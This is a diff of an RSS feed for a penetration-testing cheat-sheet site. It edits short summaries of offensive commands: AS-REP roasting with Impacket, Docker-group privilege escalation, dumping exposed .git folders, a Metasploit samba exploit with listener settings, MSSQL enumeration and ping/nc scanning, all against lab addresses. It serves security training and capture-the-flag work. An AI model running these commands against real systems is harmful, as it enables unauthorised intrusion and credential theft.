@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/asp-roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/asp-roasting/</guid>
-      <description> Impacket Download Impacket&#xA;ASP-Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 ASP-REP Vulnerable Users impacket-GetNPUsers &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 </description>
+      <description> ASP-Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 ASP-REP Vulnerable Users impacket-GetNPUsers &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 </description>
     </item>
     <item>
       <title>Compressed Files</title>
@@ -68,21 +68,21 @@
       <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dns_enum/</guid>
-      <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
+      <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
     </item>
     <item>
       <title>Docker</title>
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description> Privesc docker group docker run -v /:/mnt -it bash bash ls /mnt/root </description>
+      <description> Privesc Abuse docker group docker run -v /:/mnt -it bash bash ls /mnt/root </description>
     </item>
     <item>
       <title>dotnet</title>
       <link>https://tldrbins.github.io/dotnet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dotnet/</guid>
-      <description> dotnet Compile c# project from Linux Download dotnet&#xA;# Check if dotnet installed dotnet --info mkdir new_project cd new_project dot new console # Add dependencies if needed dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 # Add code to Program.cs # Run dotnet run </description>
+      <description> dotnet Compile c# project from Linux Download dotnet&#xA;# Check if dotnet installed dotnet --info mkdir new_project cd new_project # Init a project dot new console # Add dependencies if needed dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 # Add code to Program.cs # Run dotnet run </description>
     </item>
     <item>
       <title>Drupal</title>
@@ -131,7 +131,7 @@
       <link>https://tldrbins.github.io/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/git/</guid>
-      <description> Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; git-dumper Download git-dumper&#xA;git-dumper http://10.10.11.10/.git result/ </description>
+      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; git-dumper Download git-dumper&#xA;git-dumper http://10.</description>
     </item>
     <item>
       <title>Hydra</title>
@@ -208,7 +208,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by # or name use 15 use exploit/multi/samba/usermap_script # Show exploit settings optiions # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -243,7 +243,7 @@
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
+      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
@@ -285,7 +285,7 @@
       <link>https://tldrbins.github.io/network_discovery/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_discovery/</guid>
-      <description> Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do nc -zvn 127.0.0.1 ${i}; done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig # Windows ipconfig ip addr cat /proc/net/fib_trie Check Network Connections # TCP netstat -plant # UDP netstat -plunt # Windows netstat -ano </description>
+      <description> Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do nc -zvn 127.0.0.1 ${i}; done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig ip addr cat /proc/net/fib_trie # Windows ipconfig Check Network Connections # TCP netstat -plant # UDP netstat -plunt # Windows netstat -ano </description>
     </item>
     <item>
       <title>Network Traffic Pivoting</title>
